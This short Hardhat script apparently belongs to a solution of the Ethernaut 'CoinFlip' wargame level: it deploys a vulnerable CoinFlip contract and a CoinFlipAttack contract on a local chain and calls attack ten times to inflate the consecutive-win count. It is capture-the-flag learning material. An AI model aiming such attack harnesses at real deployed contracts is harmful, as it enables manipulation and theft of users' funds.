import { ethers } from "hardhat";

async function main() {
    const contractFactory = await ethers.getContractFactory("CoinFlip");
    const mainContract = await contractFactory.deploy();

    await mainContract.flip(true)
    const consecutiveWins = await mainContract.consecutiveWins()
    console.log(consecutiveWins)


    const attackerFactory = await ethers.getContractFactory("CoinFlipAttack");
    const attackerContract = await attackerFactory.deploy();

    for (let i = 0; i < 10; i++) {
        await attackerContract.attack(mainContract.address);
    }

    const consWins = await mainContract.consecutiveWins()
    console.log(consWins)
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
